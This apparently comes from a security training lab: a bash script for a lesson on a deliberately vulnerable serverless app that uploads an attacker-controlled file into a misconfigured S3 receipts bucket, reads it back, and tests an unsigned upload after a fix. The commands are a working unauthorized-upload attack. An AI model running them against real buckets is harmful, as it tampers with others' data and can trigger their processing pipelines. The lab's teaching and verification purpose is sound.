#!/bin/bash
# =============================================================================
# Lesson #4: Insecure Cloud Configuration — Exploit Script
# DVSA Vulnerability: S3 receipts bucket allows unauthorized file uploads
# =============================================================================
# Usage: bash lesson04_insecure_cloud_config.sh <RECEIPTS_BUCKET>
# =============================================================================

set -euo pipefail

RECEIPTS_BUCKET="${1:?Usage: $0 <RECEIPTS_BUCKET>}"

echo "============================================"
echo " Lesson #4: Insecure Cloud Configuration"
echo "============================================"
echo ""

# Step 1: Check bucket public access settings
echo "[*] Step 1: Checking bucket Block Public Access settings..."
aws s3api get-bucket-policy-status \
    --bucket "$RECEIPTS_BUCKET" 2>/dev/null || echo "[!] No bucket policy found — bucket is unrestricted"
echo ""

# Step 2: Create malicious file
echo "[*] Step 2: Creating attacker-controlled file..."
echo "ATTACKER-CONTROLLED CONTENT" > /tmp/malicious.txt
echo "[*] File created: /tmp/malicious.txt"
echo ""

# Step 3: Upload malicious file to receipts bucket
echo "[*] Step 3: Uploading malicious file to receipts bucket..."
aws s3 cp /tmp/malicious.txt \
    s3://${RECEIPTS_BUCKET}/2020/20/20/malicious.raw
echo ""

# Step 4: Verify file exists in bucket
echo "[*] Step 4: Listing bucket contents to confirm upload..."
aws s3 ls s3://${RECEIPTS_BUCKET}/ --recursive
echo ""

# Step 5: Read back the malicious file
echo "[*] Step 5: Reading back attacker-controlled content..."
aws s3 cp s3://${RECEIPTS_BUCKET}/2020/20/20/malicious.raw \
    /tmp/check.txt && cat /tmp/check.txt
echo ""

# Step 6: Test unauthenticated upload (post-fix verification)
echo "[*] Step 6: Testing unauthenticated upload (should fail after fix)..."
aws s3 cp /tmp/malicious.txt \
    s3://${RECEIPTS_BUCKET}/2020/20/20/attacker.raw \
    --no-sign-request && \
    echo "[!] VULNERABLE: Unauthenticated upload succeeded!" || \
    echo "[+] FIXED: Unauthenticated upload blocked — Access Denied"
echo ""

echo "============================================"
echo " SCREENSHOT REMINDERS:"
echo " 1. S3 bucket Permissions tab — Block Public Access OFF"
echo " 2. Terminal showing successful malicious upload (Step 3)"
echo " 3. Bucket listing showing malicious file alongside real receipts (Step 4)"
echo " 4. Attacker content confirmed readable (Step 5)"
echo " 5. CloudWatch logs showing Lambda triggered by upload"
echo " 6. Post-fix: Access Denied on unauthenticated upload (Step 6)"
echo "============================================"
